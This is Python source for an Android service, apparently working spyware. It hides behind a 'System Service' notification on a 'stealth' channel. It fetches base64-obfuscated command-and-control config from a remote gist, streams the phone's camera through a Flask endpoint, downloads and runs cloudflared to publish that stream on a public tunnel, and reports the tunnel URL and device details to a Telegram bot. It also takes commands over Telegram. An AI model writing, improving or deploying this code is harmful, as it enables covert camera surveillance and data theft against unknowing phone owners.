import os
import time
import threading
import requests
import subprocess
import cv2
import base64
import json
import numpy as np
from flask import Flask, Response
from jnius import autoclass
from android.runnable import run_on_ui_thread

# ---------- إعداد المسار الديناميكي ----------
PythonActivity = autoclass('org.kivy.android.PythonActivity')
activity = PythonActivity.mActivity
internal_path = activity.getFilesDir().getAbsolutePath()
BINARY_PATH = os.path.join(internal_path, "cloudflared")

def get_config_dynamically():
    p1 = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9aYWVuMTk5My80OGU0YTM5Y2I5M2M1YmVjOWRlMjdkMDYzYTRmY2I0ZS8="
    p2 = "cmF3L2U1YWIxZGE0MmU2ZmRhZjZmNTkwNzRmZmVmNzAxMWZlNzJmNzFhMmIv"
    p3 = "Y29uZmlnLmpzb24="
    try:
        full_url = base64.b64decode(p1).decode() + base64.b64decode(p2).decode() + base64.b64decode(p3).decode()
        r = requests.get(full_url, timeout=15)
        if r.status_code == 200:
            data = r.json()
            tokens = [t[::-1] for t in data['t']]
            vault_id = data['v']
            password = data['secret_pass']
            return tokens, vault_id, password
    except Exception as e:
        print(f"Config error: {e}")
    return [], None, None

BOT_TOKENS, VAULT_ID, CONTROL_PASSWORD = get_config_dynamically()
TELEGRAM_TOKEN = BOT_TOKENS[0] if BOT_TOKENS else None
TELEGRAM_CHAT_ID = VAULT_ID

app = Flask(__name__)
Build = autoclass('android.os.Build')
VERSION = autoclass('android.os.Build$VERSION')

# ---------- دالة إرسال الرسائل للتليجرام (مع معالجة الأخطاء) ----------
def send_telegram(text):
    if TELEGRAM_TOKEN:
        try:
            requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                          data={'chat_id': TELEGRAM_CHAT_ID, 'text': text})
        except Exception as e:
            print(f"Telegram send failed: {e}")

# ---------- تحويل الخدمة إلى Foreground ----------
def start_foreground():
    try:
        NotificationBuilder = autoclass('android.app.Notification$Builder')
        NotificationManager = autoclass('android.app.NotificationManager')
        Context = autoclass('android.content.Context')
        PendingIntent = autoclass('android.app.PendingIntent')
        Intent = autoclass('android.content.Intent')
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        channel_id = "stealth_channel_01"
        notification_manager = service.getSystemService(Context.NOTIFICATION_SERVICE)
        if Build.VERSION.SDK_INT >= 26:
            channel = autoclass('android.app.NotificationChannel')(channel_id, "Stealth Service", NotificationManager.IMPORTANCE_LOW)
            notification_manager.createNotificationChannel(channel)
        builder = NotificationBuilder(service, channel_id) if Build.VERSION.SDK_INT >= 26 else NotificationBuilder(service)
        builder.setContentTitle("System Service")
        builder.setContentText("Active")
        builder.setSmallIcon(activity.getApplicationInfo().icon)
        builder.setPriority(NotificationManager.IMPORTANCE_MIN)
        builder.setOngoing(True)
        notification = builder.build()
        service.startForeground(1001, notification)
        send_telegram("✅ Foreground service started.")
    except Exception as e:
        send_telegram(f"❌ Foreground error: {e}")

# ---------- بث الكاميرا ----------
def generate_frames():
    camera = cv2.VideoCapture(0)
    while True:
        success, frame = camera.read()
        if not success:
            break
        ret, buffer = cv2.imencode('.jpg', frame)
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + buffer.tobytes() + b'\r\n')
    camera.release()

@app.route('/live')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ---------- تحميل Cloudflared ----------
def download_cloudflared():
    if not os.path.exists(BINARY_PATH):
        try:
            send_telegram("📥 Downloading cloudflared...")
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            r = requests.get(url, stream=True)
            with open(BINARY_PATH, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            os.chmod(BINARY_PATH, 0o755)
            send_telegram("✅ Cloudflared downloaded.")
        except Exception as e:
            send_telegram(f"❌ Download failed: {e}")

# ---------- تشغيل النفق ----------
def start_tunnel():
    if not TELEGRAM_TOKEN:
        return
    download_cloudflared()
    send_telegram("🚀 Starting tunnel...")
    cmd = [BINARY_PATH, "tunnel", "--url", "http://localhost:8080"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    for line in iter(process.stdout.readline, ''):
        if "trycloudflare.com" in line:
            for w in line.split():
                if "trycloudflare.com" in w:
                    tunnel_url = w.strip() + "/live"
                    send_telegram(f"✅ TUNNEL READY: {tunnel_url}")
                    break
            break

# ---------- مستمع أوامر التليجرام ----------
def command_listener():
    if not TELEGRAM_TOKEN:
        return
    offset = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
            params = {"offset": offset, "timeout": 10}
            resp = requests.get(url, params=params, timeout=15).json()
            for update in resp.get("result", []):
                offset = update["update_id"] + 1
                msg = update.get("message", {})
                text = msg.get("text", "")
                chat_id = msg.get("chat", {}).get("id")
                if text == f"/login {CONTROL_PASSWORD}":
                    device_info = (f"Device registered:\n"
                                   f"{Build.MANUFACTURER} {Build.MODEL}\n"
                                   f"Android {VERSION.RELEASE}\n"
                                   f"ID: {Build.ID}")
                    requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                                  data={'chat_id': chat_id, 'text': device_info})
        except Exception as e:
            print(f"Listener error: {e}")
        time.sleep(3)

if __name__ == '__main__':
    # إبلاغ ببدء الخدمة
    send_telegram(f"📢 Service starting on {Build.MODEL}")
    start_foreground()  # تحويل الخدمة إلى أمامية
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080), daemon=True).start()
    threading.Thread(target=command_listener, daemon=True).start()
    start_tunnel()
